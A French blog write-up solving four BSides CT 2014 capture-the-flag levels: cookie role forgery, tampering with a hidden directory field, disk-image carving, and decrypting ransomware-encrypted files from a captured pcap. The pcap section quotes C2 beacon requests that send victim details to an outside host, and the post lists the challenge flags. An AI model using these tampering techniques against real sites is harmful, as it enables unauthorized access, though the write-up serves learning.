# Solution du CTF BSides CT 2014

Introduction
------------

Histoire de changer un peu, je me suis tourné vers le CTF de la conférence *BSides CT (Connecticut) 2014*.  

Les fichiers du CTF ayant été [mis en ligne sur GitHub](https://github.com/SkeyeLlama/BSides-CT-2014---CTF-Challenges), il est facile de mettre en place chez soit les 4 niveaux du challenge. Vous aurez juste besoin d'un serveur web avec PHP activé et de votre boîte à outils habituelle.  

Le challenge est assez simple. Il propose deux niveaux d'exploitation web, un niveau inforensique classique et un dernier niveau d'inforensique réseau avec de la crypto.  

Level 1
-------

Comme indiqué sur *GitHub* il faut avoir dézippé les fichiers dans un dossier *chal1* à la racine du serveur web.  

Une fois le navigateur lancé à la bonne adresse on trouve une page avec le titre *"Echo Tool v0.3"* qui demande de saisir soit le mot de passe de l'administrateur, soit *guest*.  

Vu que la simple pose des fichiers permet de mettre en place le challenge on se doute qu'il n'y aura pas de SQL dans l'affaire.  

Une fois que l'on a entré *"guest"* on est invité à entrer une chaîne de caractère, laquelle est juste re-affichée dans la page.  

J'ouvre l'extension *EditThisCookie* depuis *Chrome* et remarque que 3 cookies ont été définis :  

![EditThisCookie](https://raw.githubusercontent.com/devl00p/blog/master/images/editthiscookie.png)

Le cookie *role* contient un hash SHA-1 qui après recherche sur *DuckDuckGo* se révèle correspondre à *guest*.  

J'édite la valeur de ce cookie pour mettre le hash de *admin* mais je suis redirigé quand je rafraîchi la page.  

Je retente avec le hash de *administrator* et cette fois j'obtiens le flag *key{6e17f3d9348623234cbbd2dd4a900fc7}*.  

Level 2
-------

Ce second challenge est un ensemble de scripts PHP baptisé *PasteGin v1.4*.  

Un formulaire permet l'upload de fichiers mais affirme n'accepter que les fichiers avec extension *.txt*.  

L'autre formulaire permet de dresser la liste des fichiers qui ont été mis en ligne.  

Toutefois on ne voit pas immédiatement les formulaires car quand on affiche le code source HTML on trouve du Javascript obfusqué, la partie HTML est elle une coquille vide.  

C'était sans compter sur les outils de développement des navigateurs modernes : click-droit sur la page puis *"Inspecter l'élément"* permet de voir les deux formulaires qui ont été rajoutés au DOM par le javascript.  

Le second formulaire (utilisé pour lister les fichiers) attire mon attention :  

```html
<form action="list.php" method="post">
<input type="hidden" name="dir" value="./text/">
<input type="submit" name="submit" value="List Text Files">
</form>
```

Toujours via les outils de développement je modifie la valeur du champ caché *"dir"* pour mettre *"."*  

Je soumets le formulaire qui révèle alors la présence d'un fichier baptisé *topsecretkey*.  

Le fichier */chal2/topsecretkey* a le contenu *key{6fafa4aa597adac7974f11fabf2a5754}*  

Level 3
-------

On dispose d'un fichier *flash.img* qui a été compressé. Une fois décompressé on le passe à *file* qui nous indique :  

```plain
flash.img: DOS/MBR boot sector
```

Avec *ghex* (un éditeur hexadécimal) on voit les lettres *NTFS*. Une recherche sur les octets d'entête du fichier nous révèle qu'il s'agit en réalité d'une image disque *NTFS*.  

On monte le disque très facilement :  

```plain
mount -t ntfs -o ro flash.img /mnt/
```

Seulement on ne trouve qu'un fichier *IMG\_182891.png* que la morale m’empêche de poster ici (lol)  

Par conséquent j'ai préféré passer *photorec* sur l'image disque. Ce dernier retrouve des images supplémentaires : schémas de missiles et une image contenant le flag *key{3eee9d1cbd5b0062aa6b8e6398108072}*.  

Level 4
-------

On dispose d'une conversation email en PDF où un responsable demande à ce que les techniciens récupèrent ses fichiers qui ont été chiffrés par un logiciel rançonneur du type *CryptoLocker*.  

On dispose aussi d'une capture réseau au format *pcapng*. Une première lecture rapide de la capture montre des requêtes HTTP en clair et d'autres en SSL.  

J'ai décidé d'exporter la capture dans l'ancien format *pcap* (*tcpdump*) puis de la passer à la moulinette de [chaosreader](http://www.brendangregg.com/chaosreader.html) pour faciliter l'analyse.  

On remarque vite en naviguant parmi les requêtes HTTP que les infos intéressantes sont envoyées vers un script */Gh98zret.php*.  

La plupart des requêtes sont du type *Gh98zret.php?filename=Exhibit - A (1).gif&originalMD5=C699083BAF4FC584667DD8F25061C2F1* qui indique ici qu'un fichier gif a été chiffré.  

La requête et la réponse sont les suivantes :  

```plain
GET /Gh98zret.php?filename=Exhibit - A (1).gif&originalMD5=C699083BAF4FC584667DD8F25061C2F1 HTTP/1.1
Accept-Encoding: identity
Host: fatterpurse.com
Connection: close
User-Agent: CrypHI#948JJj930fjjfkdk

HTTP/1.1 200 OK
Date: Wed, 30 Jul 2014 15:38:13 GMT
Server: Apache
Vary: Accept-Encoding
Connection: close
Content-Type: text/html

<html>
...<title>Gh98zret - CrypHI#948JJj930fjjfkdk</title>
...<body>
ok
</body>
...</html>
```

Comme on disque des images chiffrés j'ai tenté de déchiffrer l'image via ce qui aurait pu être une clé dans le *User-Agent* et en testant divers algos. Mais je n'ai pas obtenu de résultats satisfaisants.  

Si on recherche les requêtes sans le mot clé *filename* on trouve d'autres informations :  

```plain
Gh98zret.php?crypt_init=1&sys=2
Gh98zret.php?crypt_init=2&sys=2
Gh98zret.php?crypt_init=3&sys=2
Gh98zret.php?crypt_init=4&sys=2
Gh98zret.php?drive_index=C&drive_label=Local Disk&sys=1
Gh98zret.php?drive_index=E&drive_label=SANDISK&sys=1
Gh98zret.php?loggedonuser=mhernandez&sys=1
Gh98zret.php?OS=Microsoft Windows XP [Version 5.1.2600]&sys=1
Gh98zret.php?&sys=1
Gh98zret.php?systemname=tpms_ceo_secret&sys=1
Gh98zret.php?victiminsideip=10.255.1.74&sys=1
Gh98zret.php?victimoutsideip=55.43.2.18&sys=1
```

Les requêtes *crypt\_init* se retrouvent dans les sessions 2020 à 2023 de *ChaosReader*. Les réponses correspondantes disposent dans le body de données encodées en base64 qui une fois décodées sont les suivantes :  

```plain
Crypt_Init - AES
Crypt_Init - CBC                                                                                                                                                                                               
IV - 00000000000000000000000000--- snip ---0000000000000000000000000000
Crypt_Init - CBC
637442eafc8399b6175621de7e94b511949e6226cc2cbf10dbe47bc46b2c1139
```

On dispose maintenant des informations nécessaires au déchiffrement des fichiers.  

J'ai commencé par le fichier texte fournit qui est le plus court :  

```plain
$ python
Python 2.7.6 (default, Nov 21 2013, 15:55:38) [GCC] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Cipher import AES
>>> key = '637442eafc8399b6175621de7e94b511949e6226cc2cbf10dbe47bc46b2c1139'.decode("hex_codec")
>>> C = open("sergey-contact.txt").read()
>>> mode = AES.MODE_CBC
>>> IV = "\x00" * 16
>>> decryptor = AES.new(key, mode, IV=IV)
>>> M = decryptor.decrypt(C)
>>> print M
Sergey:

650-559-2746
```

Et voici un script pour les images (si vous aimez les lolcats) :  

```python
from Crypto.Cipher import AES
import glob

key = '637442eafc8399b6175621de7e94b511949e6226cc2cbf10dbe47bc46b2c1139'.decode("hex_codec")
mode = AES.MODE_CBC
IV = "\x00" * 16

images = glob.glob("*.gif")

for fname in images:
    print "Decrypting", fname
    fdin = open(fname)
    C = fdin.read()
    fdin.close()

    decryptor = AES.new(key, mode, IV=IV)
    M = decryptor.decrypt(C)

    fdout = open("dec_{0}".format(fname), "w")
    fdout.write(M)
    fdout.close()
```

Un petit CTF amusant :)

*Published September 21 2014 at 21:01*